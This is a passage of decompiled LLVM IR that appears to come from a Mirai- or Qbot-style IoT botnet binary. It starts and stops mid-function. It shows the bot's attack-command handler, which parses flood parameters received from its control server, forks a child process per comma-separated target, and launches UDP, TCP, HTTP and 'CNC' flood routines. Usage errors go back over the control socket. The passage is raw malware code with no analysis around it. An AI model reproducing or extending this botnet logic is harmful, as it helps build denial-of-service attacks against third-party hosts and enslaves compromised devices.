  %v1_f9f4 = inttoptr i32 %v1_f9f0 to i32*
  %v2_f9f4 = load i32, i32* %v1_f9f4, align 4
  store i32 %v2_f9f4, i32* @r0, align 4
  %v1_f9fc = call i32 @atol(i32 %v2_f9f4)
  %v7_fa04 = icmp eq i32 %v1_f9fc, -1
  br i1 %v7_fa04, label %dec_label_pc_faa0, label %dec_label_pc_fa0c

dec_label_pc_fa0c:                                ; preds = %dec_label_pc_f9ec
  %v2_fa14 = load i32, i32* %v1_f9f4, align 4
  store i32 %v2_fa14, i32* @r0, align 4
  %v1_fa1c = call i32 @atol(i32 %v2_fa14)
  %v8_fa28 = icmp sgt i32 %v1_fa1c, 65536
  br i1 %v8_fa28, label %dec_label_pc_faa0, label %dec_label_pc_fa2c

dec_label_pc_fa2c:                                ; preds = %dec_label_pc_fa0c
  %v2_fa34 = load i32, i32* %v1_f9f4, align 4
  store i32 %v2_fa34, i32* @r0, align 4
  %v1_fa3c = call i32 @atol(i32 %v2_fa34)
  store i32 %v1_fa3c, i32* @r2, align 4
  %v8_fa50 = icmp sgt i32 %v1_fa3c, 65500
  br i1 %v8_fa50, label %dec_label_pc_faa0, label %dec_label_pc_fa54

dec_label_pc_fa54:                                ; preds = %dec_label_pc_fa2c
  %v2_fa5c = load i32, i32* %v1_f9d4, align 4
  store i32 %v2_fa5c, i32* @r0, align 4
  %v1_fa64 = call i32 @atol(i32 %v2_fa5c)
  %v8_fa70 = icmp sgt i32 %v1_fa64, 32
  br i1 %v8_fa70, label %dec_label_pc_faa0, label %dec_label_pc_fa74

dec_label_pc_fa74:                                ; preds = %dec_label_pc_fa54
  %v7_fa78 = icmp eq i32 %arg1, 7
  br i1 %v7_fa78, label %dec_label_pc_fa80, label %dec_label_pc_fab8

dec_label_pc_fa80:                                ; preds = %dec_label_pc_fa74
  %v1_fa84 = add i32 %tmp, 24
  %v1_fa88 = inttoptr i32 %v1_fa84 to i32*
  %v2_fa88 = load i32, i32* %v1_fa88, align 4
  store i32 %v2_fa88, i32* @r0, align 4
  %v1_fa90 = call i32 @atol(i32 %v2_fa88)
  %v5_fa9c = icmp sgt i32 %v1_fa90, 0
  br i1 %v5_fa9c, label %dec_label_pc_fab8, label %dec_label_pc_faa0

dec_label_pc_faa0:                                ; preds = %dec_label_pc_fa80, %dec_label_pc_fa54, %dec_label_pc_fa2c, %dec_label_pc_fa0c, %dec_label_pc_f9ec, %dec_label_pc_f9cc, %dec_label_pc_f9ac, %dec_label_pc_f98c, %dec_label_pc_f980
  %v2_faa4 = load i32, i32* @global_var_2c908.54, align 4
  %v3_fab0 = call i32 @sockprintf(i32 %v2_faa4, i32 ptrtoint ([113 x i8]* @global_var_22a2c.904 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_fab8:                                ; preds = %dec_label_pc_fa74, %dec_label_pc_fa80
  %v1_fabc = add i32 %tmp, 4
  %v1_fac0 = inttoptr i32 %v1_fabc to i32*
  %v2_fac0 = load i32, i32* %v1_fac0, align 4
  %v2_fad0 = load i32, i32* %v1_f9b4, align 4
  store i32 %v2_fad0, i32* @r0, align 4
  %v1_fad8 = call i32 @atol(i32 %v2_fad0)
  %v2_faec = load i32, i32* %v1_f994, align 4
  store i32 %v2_faec, i32* @r0, align 4
  %v1_faf4 = call i32 @atol(i32 %v2_faec)
  %v2_fb08 = load i32, i32* %v1_f9d4, align 4
  store i32 %v2_fb08, i32* @r0, align 4
  %v1_fb10 = call i32 @atol(i32 %v2_fb08)
  %v2_fb24 = load i32, i32* %v1_f9f4, align 4
  store i32 %v2_fb24, i32* @r0, align 4
  %v1_fb2c = call i32 @atol(i32 %v2_fb24)
  %v7_fb40 = icmp slt i32 %arg1, 7
  br i1 %v7_fb40, label %dec_label_pc_fb60, label %dec_label_pc_fb44

dec_label_pc_fb44:                                ; preds = %dec_label_pc_fab8
  %v1_fb48 = add i32 %tmp, 24
  %v1_fb4c = inttoptr i32 %v1_fb48 to i32*
  %v2_fb4c = load i32, i32* %v1_fb4c, align 4
  store i32 %v2_fb4c, i32* @r0, align 4
  %v1_fb54 = call i32 @atol(i32 %v2_fb4c)
  br label %dec_label_pc_fb68

dec_label_pc_fb60:                                ; preds = %dec_label_pc_fab8
  br label %dec_label_pc_fb68

dec_label_pc_fb68:                                ; preds = %dec_label_pc_fb44, %dec_label_pc_fb60
  %storemerge10 = phi i32 [ 1000, %dec_label_pc_fb60 ], [ %v1_fb54, %dec_label_pc_fb44 ]
  %v7_fb78 = icmp slt i32 %arg1, 8
  br i1 %v7_fb78, label %dec_label_pc_fb98, label %dec_label_pc_fb7c

dec_label_pc_fb7c:                                ; preds = %dec_label_pc_fb68
  %v1_fb80 = add i32 %tmp, 28
  %v1_fb84 = inttoptr i32 %v1_fb80 to i32*
  %v2_fb84 = load i32, i32* %v1_fb84, align 4
  store i32 %v2_fb84, i32* @r0, align 4
  %v1_fb8c = call i32 @atol(i32 %v2_fb84)
  br label %dec_label_pc_fbac

dec_label_pc_fb98:                                ; preds = %dec_label_pc_fb68
  br label %dec_label_pc_fbac

dec_label_pc_fbac:                                ; preds = %dec_label_pc_fb7c, %dec_label_pc_fb98
  %storemerge9 = phi i32 [ 1000000, %dec_label_pc_fb98 ], [ %v1_fb8c, %dec_label_pc_fb7c ]
  %v7_fbbc = icmp slt i32 %arg1, 9
  br i1 %v7_fbbc, label %dec_label_pc_fbdc, label %dec_label_pc_fbc0

dec_label_pc_fbc0:                                ; preds = %dec_label_pc_fbac
  %v1_fbc4 = add i32 %tmp, 32
  %v1_fbc8 = inttoptr i32 %v1_fbc4 to i32*
  %v2_fbc8 = load i32, i32* %v1_fbc8, align 4
  store i32 %v2_fbc8, i32* @r0, align 4
  %v1_fbd0 = call i32 @atol(i32 %v2_fbc8)
  br label %dec_label_pc_fbe4

dec_label_pc_fbdc:                                ; preds = %dec_label_pc_fbac
  br label %dec_label_pc_fbe4

dec_label_pc_fbe4:                                ; preds = %dec_label_pc_fbc0, %dec_label_pc_fbdc
  %storemerge8 = phi i32 [ 0, %dec_label_pc_fbdc ], [ %v1_fbd0, %dec_label_pc_fbc0 ]
  %v2_fbf8 = call i32 @__GI_strchr(i32 %v2_fac0, i32 44)
  %v2_fc00 = icmp eq i32 %v2_fbf8, 0
  br i1 %v2_fc00, label %dec_label_pc_fc94, label %dec_label_pc_fc08

dec_label_pc_fc08:                                ; preds = %dec_label_pc_fbe4
  store i32 %v2_fac0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b05c.404 to i32), i32* @r1, align 4
  %v2_fc14 = call i32 @__GI_strtok(i32 %v2_fac0, i32 ptrtoint (i32* @global_var_1b05c.404 to i32))
  %v2_fc8827 = icmp eq i32 %v2_fc14, 0
  br i1 %v2_fc8827, label %dec_label_pc_1070c, label %dec_label_pc_fc24

dec_label_pc_fc24:                                ; preds = %dec_label_pc_fc08, %dec_label_pc_fc70
  %storemerge2128 = phi i32 [ %v2_fc78, %dec_label_pc_fc70 ], [ %v2_fc14, %dec_label_pc_fc08 ]
  %v0_fc24 = call i32 @listFork()
  %v2_fc2c = icmp eq i32 %v0_fc24, 0
  br i1 %v2_fc2c, label %dec_label_pc_fc34, label %dec_label_pc_fc70

dec_label_pc_fc34:                                ; preds = %dec_label_pc_fc24
  %v8_fc64 = call i32 @sendUDP(i32 %storemerge2128, i32 %v1_fad8, i32 %v1_faf4, i32 %v1_fb10, i32 %v1_fb2c, i32 %storemerge10, i32 %storemerge9, i32 %storemerge8)
  %v1_fc6c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_fc70:                                ; preds = %dec_label_pc_fc24
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b05c.404 to i32), i32* @r1, align 4
  %v2_fc78 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1b05c.404 to i32))
  %v2_fc88 = icmp eq i32 %v2_fc78, 0
  br i1 %v2_fc88, label %dec_label_pc_1070c, label %dec_label_pc_fc24

dec_label_pc_fc94:                                ; preds = %dec_label_pc_fbe4
  %v0_fc94 = call i32 @listFork()
  %v2_fc9c = icmp eq i32 %v0_fc94, 0
  br i1 %v2_fc9c, label %dec_label_pc_fca4, label %dec_label_pc_1070c

dec_label_pc_fca4:                                ; preds = %dec_label_pc_fc94
  %v8_fcd4 = call i32 @sendUDP(i32 %v2_fac0, i32 %v1_fad8, i32 %v1_faf4, i32 %v1_fb10, i32 %v1_fb2c, i32 %storemerge10, i32 %storemerge9, i32 %storemerge8)
  %v1_fcdc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_fce0:                                ; preds = %dec_label_pc_f960
  %v2_fce4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_22aa0.907 to i32), i32* @r1, align 4
  %v3_fcf0 = inttoptr i32 %v2_fce4 to i8*
  %v4_fcf0 = call i32 @__GI_strcoll(i8* %v3_fcf0, i32 ptrtoint ([4 x i8]* @global_var_22aa0.907 to i32))
  %v2_fcf8 = icmp eq i32 %v4_fcf0, 0
  br i1 %v2_fcf8, label %dec_label_pc_fd00, label %dec_label_pc_ffc4

dec_label_pc_fd00:                                ; preds = %dec_label_pc_fce0
  %v7_fd08 = icmp slt i32 %arg1, 6
  br i1 %v7_fd08, label %dec_label_pc_fde4, label %dec_label_pc_fd0c

dec_label_pc_fd0c:                                ; preds = %dec_label_pc_fd00
  %v1_fd10 = add i32 %tmp, 12
  %v1_fd14 = inttoptr i32 %v1_fd10 to i32*
  %v2_fd14 = load i32, i32* %v1_fd14, align 4
  store i32 %v2_fd14, i32* @r0, align 4
  %v1_fd1c = call i32 @atol(i32 %v2_fd14)
  %v7_fd24 = icmp eq i32 %v1_fd1c, -1
  br i1 %v7_fd24, label %dec_label_pc_fde4, label %dec_label_pc_fd2c

dec_label_pc_fd2c:                                ; preds = %dec_label_pc_fd0c
  %v1_fd30 = add i32 %tmp, 8
  %v1_fd34 = inttoptr i32 %v1_fd30 to i32*
  %v2_fd34 = load i32, i32* %v1_fd34, align 4
  store i32 %v2_fd34, i32* @r0, align 4
  %v1_fd3c = call i32 @atol(i32 %v2_fd34)
  %v7_fd44 = icmp eq i32 %v1_fd3c, -1
  br i1 %v7_fd44, label %dec_label_pc_fde4, label %dec_label_pc_fd4c

dec_label_pc_fd4c:                                ; preds = %dec_label_pc_fd2c
  %v1_fd50 = add i32 %tmp, 16
  %v1_fd54 = inttoptr i32 %v1_fd50 to i32*
  %v2_fd54 = load i32, i32* %v1_fd54, align 4
  store i32 %v2_fd54, i32* @r0, align 4
  %v1_fd5c = call i32 @atol(i32 %v2_fd54)
  %v7_fd64 = icmp eq i32 %v1_fd5c, -1
  br i1 %v7_fd64, label %dec_label_pc_fde4, label %dec_label_pc_fd6c

dec_label_pc_fd6c:                                ; preds = %dec_label_pc_fd4c
  %v2_fd74 = load i32, i32* %v1_fd54, align 4
  store i32 %v2_fd74, i32* @r0, align 4
  %v1_fd7c = call i32 @atol(i32 %v2_fd74)
  %v8_fd88 = icmp sgt i32 %v1_fd7c, 32
  br i1 %v8_fd88, label %dec_label_pc_fde4, label %dec_label_pc_fd8c

dec_label_pc_fd8c:                                ; preds = %dec_label_pc_fd6c
  %v7_fd94 = icmp slt i32 %arg1, 7
  br i1 %v7_fd94, label %dec_label_pc_fdb8, label %dec_label_pc_fd98

dec_label_pc_fd98:                                ; preds = %dec_label_pc_fd8c
  %v1_fd9c = add i32 %tmp, 24
  %v1_fda0 = inttoptr i32 %v1_fd9c to i32*
  %v2_fda0 = load i32, i32* %v1_fda0, align 4
  store i32 %v2_fda0, i32* @r0, align 4
  %v1_fda8 = call i32 @atol(i32 %v2_fda0)
  %v1_fdb0 = icmp slt i32 %v1_fda8, 0
  br i1 %v1_fdb0, label %dec_label_pc_fde4, label %dec_label_pc_fdb8

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fd98, %dec_label_pc_fd8c
  %v7_fdbc = icmp eq i32 %arg1, 8
  br i1 %v7_fdbc, label %dec_label_pc_fdc4, label %dec_label_pc_fdfc

dec_label_pc_fdc4:                                ; preds = %dec_label_pc_fdb8
  %v1_fdc8 = add i32 %tmp, 28
  %v1_fdcc = inttoptr i32 %v1_fdc8 to i32*
  %v2_fdcc = load i32, i32* %v1_fdcc, align 4
  store i32 %v2_fdcc, i32* @r0, align 4
  %v1_fdd4 = call i32 @atol(i32 %v2_fdcc)
  %v5_fde0 = icmp sgt i32 %v1_fdd4, 0
  br i1 %v5_fde0, label %dec_label_pc_fdfc, label %dec_label_pc_fde4

dec_label_pc_fde4:                                ; preds = %dec_label_pc_fdc4, %dec_label_pc_fd98, %dec_label_pc_fd6c, %dec_label_pc_fd4c, %dec_label_pc_fd2c, %dec_label_pc_fd0c, %dec_label_pc_fd00
  %v2_fde8 = load i32, i32* @global_var_2c908.54, align 4
  %v3_fdf4 = call i32 @sockprintf(i32 %v2_fde8, i32 ptrtoint ([186 x i8]* @global_var_22aa4.909 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_fdfc:                                ; preds = %dec_label_pc_fdb8, %dec_label_pc_fdc4
  %v1_fe00 = add i32 %tmp, 4
  %v1_fe04 = inttoptr i32 %v1_fe00 to i32*
  %v2_fe04 = load i32, i32* %v1_fe04, align 4
  %v2_fe14 = load i32, i32* %v1_fd34, align 4
  store i32 %v2_fe14, i32* @r0, align 4
  %v1_fe1c = call i32 @atol(i32 %v2_fe14)
  %v2_fe30 = load i32, i32* %v1_fd14, align 4
  store i32 %v2_fe30, i32* @r0, align 4
  %v1_fe38 = call i32 @atol(i32 %v2_fe30)
  %v2_fe4c = load i32, i32* %v1_fd54, align 4
  store i32 %v2_fe4c, i32* @r0, align 4
  %v1_fe54 = call i32 @atol(i32 %v2_fe4c)
  %v1_fe64 = add i32 %tmp, 20
  %v1_fe68 = inttoptr i32 %v1_fe64 to i32*
  %v2_fe68 = load i32, i32* %v1_fe68, align 4
  br i1 %v7_fdbc, label %dec_label_pc_fe7c, label %dec_label_pc_fe98

dec_label_pc_fe7c:                                ; preds = %dec_label_pc_fdfc
  %v1_fe80 = add i32 %tmp, 28
  %v1_fe84 = inttoptr i32 %v1_fe80 to i32*
  %v2_fe84 = load i32, i32* %v1_fe84, align 4
  store i32 %v2_fe84, i32* @r0, align 4
  %v1_fe8c = call i32 @atol(i32 %v2_fe84)
  br label %dec_label_pc_fea0

dec_label_pc_fe98:                                ; preds = %dec_label_pc_fdfc
  br label %dec_label_pc_fea0

dec_label_pc_fea0:                                ; preds = %dec_label_pc_fe7c, %dec_label_pc_fe98
  %storemerge7 = phi i32 [ 10, %dec_label_pc_fe98 ], [ %v1_fe8c, %dec_label_pc_fe7c ]
  br i1 %v7_fd94, label %dec_label_pc_fed0, label %dec_label_pc_feb4

dec_label_pc_feb4:                                ; preds = %dec_label_pc_fea0
  %v1_feb8 = add i32 %tmp, 24
  %v1_febc = inttoptr i32 %v1_feb8 to i32*
  %v2_febc = load i32, i32* %v1_febc, align 4
  store i32 %v2_febc, i32* @r0, align 4
  %v1_fec4 = call i32 @atol(i32 %v2_febc)
  br label %dec_label_pc_fed8

dec_label_pc_fed0:                                ; preds = %dec_label_pc_fea0
  br label %dec_label_pc_fed8

dec_label_pc_fed8:                                ; preds = %dec_label_pc_feb4, %dec_label_pc_fed0
  %storemerge6 = phi i32 [ 0, %dec_label_pc_fed0 ], [ %v1_fec4, %dec_label_pc_feb4 ]
  %v2_feec = call i32 @__GI_strchr(i32 %v2_fe04, i32 44)
  %v2_fef4 = icmp eq i32 %v2_feec, 0
  br i1 %v2_fef4, label %dec_label_pc_ff80, label %dec_label_pc_fefc

dec_label_pc_fefc:                                ; preds = %dec_label_pc_fed8
  store i32 %v2_fe04, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b05c.404 to i32), i32* @r1, align 4
  %v2_ff08 = call i32 @__GI_strtok(i32 %v2_fe04, i32 ptrtoint (i32* @global_var_1b05c.404 to i32))
  %v2_ff7438 = icmp eq i32 %v2_ff08, 0
  br i1 %v2_ff7438, label %dec_label_pc_ffc4, label %dec_label_pc_ff18

dec_label_pc_ff18:                                ; preds = %dec_label_pc_fefc, %dec_label_pc_ff5c
  %storemerge1939 = phi i32 [ %v2_ff64, %dec_label_pc_ff5c ], [ %v2_ff08, %dec_label_pc_fefc ]
  %v0_ff18 = call i32 @listFork()
  %v2_ff20 = icmp eq i32 %v0_ff18, 0
  br i1 %v2_ff20, label %dec_label_pc_ff28, label %dec_label_pc_ff5c

dec_label_pc_ff28:                                ; preds = %dec_label_pc_ff18
  %v7_ff50 = call i32 @sendTCP(i32 %storemerge1939, i32 %v1_fe1c, i32 %v1_fe38, i32 %v1_fe54, i32 %v2_fe68, i32 %storemerge6, i32 %storemerge7)
  %v1_ff58 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_ff5c:                                ; preds = %dec_label_pc_ff18
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b05c.404 to i32), i32* @r1, align 4
  %v2_ff64 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1b05c.404 to i32))
  %v2_ff74 = icmp eq i32 %v2_ff64, 0
  br i1 %v2_ff74, label %dec_label_pc_ffc4, label %dec_label_pc_ff18

dec_label_pc_ff80:                                ; preds = %dec_label_pc_fed8
  %v0_ff80 = call i32 @listFork()
  %v2_ff88 = icmp eq i32 %v0_ff80, 0
  br i1 %v2_ff88, label %dec_label_pc_ff90, label %dec_label_pc_ffc4

dec_label_pc_ff90:                                ; preds = %dec_label_pc_ff80
  %v7_ffb8 = call i32 @sendTCP(i32 %v2_fe04, i32 %v1_fe1c, i32 %v1_fe38, i32 %v1_fe54, i32 %v2_fe68, i32 %storemerge6, i32 %storemerge7)
  %v1_ffc0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_ffc4:                                ; preds = %dec_label_pc_ff5c, %dec_label_pc_fefc, %dec_label_pc_ff80, %dec_label_pc_fce0
  %v2_ffc8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_22b60.911 to i32), i32* @r1, align 4
  %v3_ffd4 = inttoptr i32 %v2_ffc8 to i8*
  %v4_ffd4 = call i32 @__GI_strcoll(i8* %v3_ffd4, i32 ptrtoint ([5 x i8]* @global_var_22b60.911 to i32))
  %v2_ffdc = icmp eq i32 %v4_ffd4, 0
  br i1 %v2_ffdc, label %dec_label_pc_ffe4, label %dec_label_pc_101cc

dec_label_pc_ffe4:                                ; preds = %dec_label_pc_ffc4
  %v7_ffec = icmp slt i32 %arg1, 6
  br i1 %v7_ffec, label %dec_label_pc_1070c, label %dec_label_pc_fff0

dec_label_pc_fff0:                                ; preds = %dec_label_pc_ffe4
  %v1_fff4 = add i32 %tmp, 4
  %v1_fff8 = inttoptr i32 %v1_fff4 to i32*
  %v2_fff8 = load i32, i32* %v1_fff8, align 4
  %v2_10004 = call i32 @__GI_strchr(i32 %v2_fff8, i32 44)
  %v2_1000c = icmp eq i32 %v2_10004, 0
  br i1 %v2_1000c, label %dec_label_pc_10114, label %dec_label_pc_10014

dec_label_pc_10014:                               ; preds = %dec_label_pc_fff0
  %v2_1001c = load i32, i32* %v1_fff8, align 4
  store i32 %v2_1001c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b05c.404 to i32), i32* @r1, align 4
  %v2_10028 = call i32 @__GI_strtok(i32 %v2_1001c, i32 ptrtoint (i32* @global_var_1b05c.404 to i32))
  %v2_1010836 = icmp eq i32 %v2_10028, 0
  br i1 %v2_1010836, label %dec_label_pc_101cc, label %dec_label_pc_10038

dec_label_pc_10038:                               ; preds = %dec_label_pc_10014, %dec_label_pc_100f0
  %v0_10038 = call i32 @listFork()
  %v2_10040 = icmp eq i32 %v0_10038, 0
  br i1 %v2_10040, label %dec_label_pc_10048, label %dec_label_pc_100f0

dec_label_pc_10048:                               ; preds = %dec_label_pc_10038
  %v2_10050 = load i32, i32* %v1_fff8, align 4
  store i32 %v2_10050, i32* @r5, align 4
  %v1_1005c = add i32 %tmp, 8
  %v1_10060 = inttoptr i32 %v1_1005c to i32*
  %v2_10060 = load i32, i32* %v1_10060, align 4
  store i32 %v2_10060, i32* @r6, align 4
  %v1_1006c = add i32 %tmp, 12
  %v1_10070 = inttoptr i32 %v1_1006c to i32*
  %v2_10070 = load i32, i32* %v1_10070, align 4
  store i32 %v2_10070, i32* @r0, align 4
  %v1_10078 = call i32 @atol(i32 %v2_10070)
  %v3_10084 = urem i32 %v1_10078, 65536
  store i32 %v3_10084, i32* @r7, align 4
  %v1_10090 = add i32 %tmp, 16
  %v1_10094 = inttoptr i32 %v1_10090 to i32*
  %v2_10094 = load i32, i32* %v1_10094, align 4
  store i32 %v2_10094, i32* @r8, align 4
  %v1_100a0 = add i32 %tmp, 20
  %v1_100a4 = inttoptr i32 %v1_100a0 to i32*
  %v2_100a4 = load i32, i32* %v1_100a4, align 4
  store i32 %v2_100a4, i32* @r0, align 4
  %v1_100ac = call i32 @atol(i32 %v2_100a4)
  store i32 %v1_100ac, i32* @r4, align 4
  %v1_100b8 = add i32 %tmp, 24
  %v1_100bc = inttoptr i32 %v1_100b8 to i32*
  %v2_100bc = load i32, i32* %v1_100bc, align 4
  store i32 %v2_100bc, i32* @r0, align 4
  %v1_100c4 = call i32 @atol(i32 %v2_100bc)
  %v0_100cc = load i32, i32* @r4, align 4
  %v0_100d4 = load i32, i32* @r5, align 4
  %v0_100d8 = load i32, i32* @r6, align 4
  %v0_100dc = load i32, i32* @r7, align 4
  %v0_100e0 = load i32, i32* @r8, align 4
  %v6_100e4 = trunc i32 %v0_100dc to i8
  %v7_100e4 = call i32 @sendHTTP(i32 %v0_100d4, i32 %v0_100d8, i8 %v6_100e4, i32 %v0_100e0, i32 %v0_100cc, i32 %v1_100c4)
  %v1_100ec = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_100f0:                               ; preds = %dec_label_pc_10038
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b05c.404 to i32), i32* @r1, align 4
  %v2_100f8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1b05c.404 to i32))
  %v2_10108 = icmp eq i32 %v2_100f8, 0
  br i1 %v2_10108, label %dec_label_pc_101cc, label %dec_label_pc_10038

dec_label_pc_10114:                               ; preds = %dec_label_pc_fff0
  %v0_10114 = call i32 @listFork()
  %v2_1011c = icmp eq i32 %v0_10114, 0
  br i1 %v2_1011c, label %dec_label_pc_10124, label %dec_label_pc_1070c

dec_label_pc_10124:                               ; preds = %dec_label_pc_10114
  %v2_1012c = load i32, i32* %v1_fff8, align 4
  store i32 %v2_1012c, i32* @r5, align 4
  %v1_10138 = add i32 %tmp, 8
  %v1_1013c = inttoptr i32 %v1_10138 to i32*
  %v2_1013c = load i32, i32* %v1_1013c, align 4
  store i32 %v2_1013c, i32* @r6, align 4
  %v1_10148 = add i32 %tmp, 12
  %v1_1014c = inttoptr i32 %v1_10148 to i32*
  %v2_1014c = load i32, i32* %v1_1014c, align 4
  store i32 %v2_1014c, i32* @r0, align 4
  %v1_10154 = call i32 @atol(i32 %v2_1014c)
  %v3_10160 = urem i32 %v1_10154, 65536
  store i32 %v3_10160, i32* @r7, align 4
  %v1_1016c = add i32 %tmp, 16
  %v1_10170 = inttoptr i32 %v1_1016c to i32*
  %v2_10170 = load i32, i32* %v1_10170, align 4
  store i32 %v2_10170, i32* @r8, align 4
  %v1_1017c = add i32 %tmp, 20
  %v1_10180 = inttoptr i32 %v1_1017c to i32*
  %v2_10180 = load i32, i32* %v1_10180, align 4
  store i32 %v2_10180, i32* @r0, align 4
  %v1_10188 = call i32 @atol(i32 %v2_10180)
  store i32 %v1_10188, i32* @r4, align 4
  %v1_10194 = add i32 %tmp, 24
  %v1_10198 = inttoptr i32 %v1_10194 to i32*
  %v2_10198 = load i32, i32* %v1_10198, align 4
  store i32 %v2_10198, i32* @r0, align 4
  %v1_101a0 = call i32 @atol(i32 %v2_10198)
  %v0_101a8 = load i32, i32* @r4, align 4
  %v0_101b0 = load i32, i32* @r5, align 4
  %v0_101b4 = load i32, i32* @r6, align 4
  %v0_101b8 = load i32, i32* @r7, align 4
  %v0_101bc = load i32, i32* @r8, align 4
  %v6_101c0 = trunc i32 %v0_101b8 to i8
  %v7_101c0 = call i32 @sendHTTP(i32 %v0_101b0, i32 %v0_101b4, i8 %v6_101c0, i32 %v0_101bc, i32 %v0_101a8, i32 %v1_101a0)
  %v1_101c8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_101cc:                               ; preds = %dec_label_pc_100f0, %dec_label_pc_10014, %dec_label_pc_ffc4
  %v2_101d0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_22b68.913 to i32), i32* @r1, align 4
  %v3_101dc = inttoptr i32 %v2_101d0 to i8*
  %v4_101dc = call i32 @__GI_strcoll(i8* %v3_101dc, i32 ptrtoint ([4 x i8]* @global_var_22b68.913 to i32))
  %v2_101e4 = icmp eq i32 %v4_101dc, 0
  br i1 %v2_101e4, label %dec_label_pc_101ec, label %dec_label_pc_10354

dec_label_pc_101ec:                               ; preds = %dec_label_pc_101cc
  %v7_101f4 = icmp slt i32 %arg1, 4
  br i1 %v7_101f4, label %dec_label_pc_10238, label %dec_label_pc_101f8

dec_label_pc_101f8:                               ; preds = %dec_label_pc_101ec
  %v1_101fc = add i32 %tmp, 8
  %v1_10200 = inttoptr i32 %v1_101fc to i32*
  %v2_10200 = load i32, i32* %v1_10200, align 4
  store i32 %v2_10200, i32* @r0, align 4
  %v1_10208 = call i32 @atol(i32 %v2_10200)
  %tmp106 = icmp slt i32 %v1_10208, 1
  br i1 %tmp106, label %dec_label_pc_10238, label %dec_label_pc_10218

dec_label_pc_10218:                               ; preds = %dec_label_pc_101f8
  %v1_1021c = add i32 %tmp, 12
  %v1_10220 = inttoptr i32 %v1_1021c to i32*
  %v2_10220 = load i32, i32* %v1_10220, align 4
  store i32 %v2_10220, i32* @r0, align 4
  %v1_10228 = call i32 @atol(i32 %v2_10220)
  %v5_10234 = icmp sgt i32 %v1_10228, 0
  br i1 %v5_10234, label %dec_label_pc_10250, label %dec_label_pc_10238

dec_label_pc_10238:                               ; preds = %dec_label_pc_10218, %dec_label_pc_101f8, %dec_label_pc_101ec
  %v2_1023c = load i32, i32* @global_var_2c908.54, align 4
  %v3_10248 = call i32 @sockprintf(i32 %v2_1023c, i32 ptrtoint ([27 x i8]* @global_var_22b6c.915 to i32))
  br label %dec_label_pc_1070c

dec_label_pc_10250:                               ; preds = %dec_label_pc_10218
  %v1_10254 = add i32 %tmp, 4
  %v1_10258 = inttoptr i32 %v1_10254 to i32*
  %v2_10258 = load i32, i32* %v1_10258, align 4
  %v2_10268 = load i32, i32* %v1_10200, align 4
  store i32 %v2_10268, i32* @r0, align 4
  %v1_10270 = call i32 @atol(i32 %v2_10268)
  %v2_10284 = load i32, i32* %v1_10220, align 4
  store i32 %v2_10284, i32* @r0, align 4
  %v1_1028c = call i32 @atol(i32 %v2_10284)
  %v2_102a4 = call i32 @__GI_strchr(i32 %v2_10258, i32 44)
  %v2_102ac = icmp eq i32 %v2_102a4, 0
  br i1 %v2_102ac, label %dec_label_pc_1032c, label %dec_label_pc_102b4

dec_label_pc_102b4:                               ; preds = %dec_label_pc_10250
  store i32 %v2_10258, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b05c.404 to i32), i32* @r1, align 4
  %v2_102c0 = call i32 @__GI_strtok(i32 %v2_10258, i32 ptrtoint (i32* @global_var_1b05c.404 to i32))
  %v2_1032033 = icmp eq i32 %v2_102c0, 0
  br i1 %v2_1032033, label %dec_label_pc_10354, label %dec_label_pc_102d0

dec_label_pc_102d0:                               ; preds = %dec_label_pc_102b4, %dec_label_pc_10308
  %storemerge1534 = phi i32 [ %v2_10310, %dec_label_pc_10308 ], [ %v2_102c0, %dec_label_pc_102b4 ]
  %v0_102d0 = call i32 @listFork()
  %v2_102d8 = icmp eq i32 %v0_102d0, 0
  br i1 %v2_102d8, label %dec_label_pc_102e0, label %dec_label_pc_10308

dec_label_pc_102e0:                               ; preds = %dec_label_pc_102d0
  %v4_102ec = call i32 @sendCNC(i32 %storemerge1534, i32 %v1_10270, i32 %v1_1028c, i32 0)
  %v2_102f4 = load i32, i32* @global_var_2c908.54, align 4
  %v1_102fc = call i32 @__libc_close(i32 %v2_102f4)
  %v1_10304 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10308:                               ; preds = %dec_label_pc_102d0
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1b05c.404 to i32), i32* @r1, align 4
  %v2_10310 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1b05c.404 to i32))
  %v2_10320 = icmp eq i32 %v2_10310, 0
  br i1 %v2_10320, label %dec_label_pc_10354, label %dec_label_pc_102d0

dec_label_pc_1032c:                               ; preds = %dec_label_pc_10250
  %v0_1032c = call i32 @listFork()
  %v2_10334 = icmp eq i32 %v0_1032c, 0
  br i1 %v2_10334, label %dec_label_pc_1033c, label %dec_label_pc_1070c

dec_label_pc_1033c:                               ; preds = %dec_label_pc_1032c
  %v4_10348 = call i32 @sendCNC(i32 %v2_10258, i32 %v1_10270, i32 %v1_1028c, i32 0)
  %v1_10350 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10354:                               ; preds = %dec_label_pc_10308, %dec_label_pc_102b4, %dec_label_pc_101cc
  %v2_10358 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_22b88.917 to i32), i32* @r1, align 4
